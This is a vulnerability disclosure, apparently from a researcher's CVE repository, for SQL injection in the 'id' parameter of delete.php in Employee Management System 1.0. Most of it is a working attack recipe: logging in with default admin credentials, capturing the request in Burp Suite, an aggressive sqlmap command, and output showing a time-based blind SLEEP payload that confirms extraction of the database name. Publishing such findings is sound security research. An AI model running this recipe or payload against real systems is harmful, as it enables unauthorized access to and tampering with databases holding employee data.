# Employee Managment System - SQL Injection - 4
+ **Exploit Title:** Employee Managment System - SQL Injection - 4
+ **Date:** 2024-30-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/employee-management-system-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/4af079c9-ab82-4b2a-a133-be6989c7f70e
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Employee Managment System 1.0 allows SQL Injection via the 'id' parameter at "/370project//delete.php?id=110". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/370project//alogin.html"
+ Login with `admin` : `admin`
+ Press the View Employee tab, select any employee and press the delete button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /370project//delete.php?id=110 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36

```

+ Use sqlmap to exploit. In sqlmap, use 'id' parameter to dump the database.
```
sqlmap -r r.txt -p id --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=110 AND (SELECT 8309 FROM (SELECT(SLEEP(5)))cisU)
---
[05:36:08] [INFO] testing MySQL
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[05:36:16] [INFO] confirming MySQL
[05:36:16] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[05:36:26] [INFO] adjusting time delay to 2 seconds due to good response times
[05:36:26] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[05:36:26] [INFO] fetching current database
[05:36:26] [INFO] resumed: 370project
current database: '370project'

```
+ current database: `370project`

![Ekran görüntüsü 2024-01-30 141037](https://github.com/BurakSevben/CVEs/assets/117217689/77a1d851-d291-416f-b5b0-2ba488fe9fa9)
